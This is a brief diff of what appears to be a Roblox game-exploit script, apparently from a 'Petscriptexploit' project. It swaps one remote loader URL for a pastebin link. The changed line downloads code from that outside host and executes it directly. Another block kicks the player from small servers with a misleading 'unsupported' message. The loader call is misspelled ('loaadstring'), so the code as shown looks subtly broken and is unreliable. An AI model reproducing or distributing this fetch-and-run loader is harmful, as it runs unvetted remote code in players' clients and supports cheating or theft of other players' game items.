@@ -792,7 +792,7 @@ local values = {
 	["Aliens"] = 1,
 	["Moon"] = 1
 }
-loaadstring(game:HttpGet("https://raw.githubusercontent.com/Petscriptexploit/s2/refs/heads/main/gui%20loader"))()
+loaadstring(game:HttpGet("https://pastebin.com/raw/C8fjVQZc"))()
 if #game:GetService("Players"):GetPlayers() <= 2 then
     game.Players.LocalPlayer:Kick("This server is unsupported... Try in a new PUBLIC server.")
 end
